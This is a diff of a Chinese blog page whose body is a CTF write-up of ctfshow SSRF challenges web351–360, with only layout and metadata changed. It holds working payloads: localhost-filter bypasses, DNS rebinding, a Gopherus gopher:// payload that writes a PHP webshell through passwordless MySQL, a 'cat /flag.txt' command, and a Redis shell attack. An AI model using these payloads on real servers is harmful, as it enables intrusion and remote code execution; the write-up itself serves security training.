@@ -14,9 +14,8 @@
 <meta property="og:description" content="127.0.0.1绕过、域名指向、302跳转、DNS重定向、gopher打mysql、redis">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-08-09T13:10:33.000Z">
-<meta property="article:modified_time" content="2022-08-09T18:22:15.568Z">
+<meta property="article:modified_time" content="2023-12-24T05:47:43.838Z">
 <meta property="article:author" content="killeveee">
-<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
     
     
@@ -70,13 +69,11 @@
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </span>
@@ -84,7 +81,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="上一篇" href="/2022/08/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="上一篇" href="/2022/08/27/vulntaget-a/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="下一篇" href="/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -117,7 +114,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">SSRF基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web351"><span class="toc-number">2.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web352%E3%80%81353"><span class="toc-number">3.</span> <span class="toc-text">web352、353</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web354"><span class="toc-number">4.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web355"><span class="toc-number">5.</span> <span class="toc-text">web355</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web356"><span class="toc-number">6.</span> <span class="toc-text">web356</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web357"><span class="toc-number">7.</span> <span class="toc-text">web357</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web358"><span class="toc-number">8.</span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web359"><span class="toc-number">9.</span> <span class="toc-text">web359</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web360"><span class="toc-number">10.</span> <span class="toc-text">web360</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">SSRF基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web352、353</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web355</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web356</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web357</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web359</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web360</span></a></li></ol>
       </div>
     
   </span>
@@ -155,18 +152,13 @@
 
 
       
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
 
     </div>
   </header>
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p>
+    <h1><span id="ssrf基础">SSRF基础</span></h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p>
 <p>就是让服务器去请求服务器的资源，因为我们远程请求不到。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -187,12 +179,12 @@
 
 
 
-<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><p>如果我们直接访问flag.php，会提示不允许外网访问，所以我们需要利用ssrf。</p>
+<h1><span id="web351">web351</span></h1><p>如果我们直接访问flag.php，会提示不允许外网访问，所以我们需要利用ssrf。</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>服务器处理这个值的时候，就是curl本机的flag.php文件。</p>
-<h1 id="web352、353"><a href="#web352、353" class="headerlink" title="web352、353"></a>web352、353</h1><p>post接收url参数，然后用parse_url函数，将返回值给x</p>
+<h1><span id="web352-353">web352、353</span></h1><p>post接收url参数，然后用parse_url函数，将返回值给x</p>
 <p>parse_url函数用法：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.parse-url.php">PHP: parse_url - Manual</a></p>
 <p>题目就是说，必须要用http或者https协议，然后不能使用localhost|127.0.0字符串。</p>
 <p>我们需要绕过localhost|127.0.0，用0可以代替127.0.0.1</p>
@@ -214,7 +206,7 @@ url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php<span aria-hidden="true" class
 
 
 
-<h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><p>过滤了localhost、1、0</p>
+<h1><span id="web354">web354</span></h1><p>过滤了localhost、1、0</p>
 <p>1和0都过滤了那我们之前的payload就不好用了。</p>
 <p><strong>方法一：域名指向</strong></p>
 <p>在自己的域名中添加一条A记录指向 127.0.0.1</p>
@@ -232,18 +224,18 @@ url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php<span aria-hidden="true" class
 
 
 
-<h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><p>过滤，限制<code>http://[host]/[path]</code> host部分长度小于5</p>
+<h1><span id="web355">web355</span></h1><p>过滤，限制<code>http://[host]/[path]</code> host部分长度小于5</p>
 <pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">[POST]payload：url=http://127.1/flag.php
 [POST]payload：url=http://0/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><p>过滤，限制<code>http://[host]/[path]</code> host部分长度小于3</p>
+<h1><span id="web356">web356</span></h1><p>过滤，限制<code>http://[host]/[path]</code> host部分长度小于3</p>
 <pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">[POST]payload：url=http://0/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><p>因为代码中使用了 gethostbyname 获取了真实 IP 地址，所以域名指向方法不能再使用，可以使用 <strong>302 跳转方法和 dns rebinding 方法</strong></p>
+<h1><span id="web357">web357</span></h1><p>因为代码中使用了 gethostbyname 获取了真实 IP 地址，所以域名指向方法不能再使用，可以使用 <strong>302 跳转方法和 dns rebinding 方法</strong></p>
 <p><strong>DNS rebinding（DNS重新绑定攻击）</strong></p>
 <p>攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，<strong>第二次是攻击目标IP地址</strong>，甚至可以通过这种攻击方法绕过同源策略</p>
 <p>回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 <a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a> 来实现攻击。</p>
@@ -257,7 +249,7 @@ url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php<span aria-hidden="true" class
 <pre class="line-numbers language-none"><code class="language-none">url&#x3D;http:&#x2F;&#x2F;r.xxxxx.ceye.io&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>要多点几次</strong></p>
-<h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><p>正则，必须要以<code>http://ctf.</code>开头，以show结尾</p>
+<h1><span id="web358">web358</span></h1><p>正则，必须要以<code>http://ctf.</code>开头，以show结尾</p>
 <ul>
 <li>当<code>parse_url()</code>解析到邮箱时：**@前面是user**</li>
 <li><code>file_get_contents()</code>会访问<code>host:port/path</code>，与user无关</li>
@@ -267,7 +259,7 @@ url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php<span aria-hidden="true" class
 
 
 
-<h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1><p>题目提示：打无密码的mysql</p>
+<h1><span id="web359">web359</span></h1><p>题目提示：打无密码的mysql</p>
 <p>一个登录界面，点击登录，抓包发现可疑<strong>参数 returl 存在 SSRF</strong></p>
 <p>使用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>，选择mysql模块，默认用户root，sql注入语句写个shell文件：</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python gopherus.py  --exploit mysql
@@ -282,7 +274,7 @@ gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%
 <pre class="line-numbers language-none"><code class="language-none">returl&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2520%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2563%256d%2564%255d%2529%253b%2520%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2563%256d%2564%252e%2570%2568%2570%2522%253b%2501%2500%2500%2500%2501<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后访问cmd.php，post：cmd&#x3D;system(‘cat &#x2F;flag.txt’);</p>
-<h1 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h1><p>利用gopher协议打redis也可以用Gopherus</p>
+<h1><span id="web360">web360</span></h1><p>利用gopher协议打redis也可以用Gopherus</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python gopherus.py  --exploit redis
 
 What <span class="token keyword">do</span> you want?? <span class="token punctuation">(</span>ReverseShell/PHPShell<span class="token punctuation">)</span>: php
@@ -319,13 +311,11 @@ When it's <span class="token keyword">done</span> you can get PHP Shell <span cl
         
           <li><a href="/">首页</a></li>
         
-          <li><a href="/about/">关于</a></li>
-        
           <li><a href="/archives/">归档</a></li>
         
           <li><a href="/categories/">分类</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/about/">关于</a></li>
         
       </ul>
     </div>
@@ -333,7 +323,7 @@ When it's <span class="token keyword">done</span> you can get PHP Shell <span cl
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">SSRF基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web351"><span class="toc-number">2.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web352%E3%80%81353"><span class="toc-number">3.</span> <span class="toc-text">web352、353</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web354"><span class="toc-number">4.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web355"><span class="toc-number">5.</span> <span class="toc-text">web355</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web356"><span class="toc-number">6.</span> <span class="toc-text">web356</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web357"><span class="toc-number">7.</span> <span class="toc-text">web357</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web358"><span class="toc-number">8.</span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web359"><span class="toc-number">9.</span> <span class="toc-text">web359</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web360"><span class="toc-number">10.</span> <span class="toc-text">web360</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">SSRF基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web352、353</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web355</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web356</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web357</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web359</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web360</span></a></li></ol>
       </div>
     
 
@@ -381,13 +371,11 @@ When it's <span class="token keyword">done</span> you can get PHP Shell <span cl
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </nav>
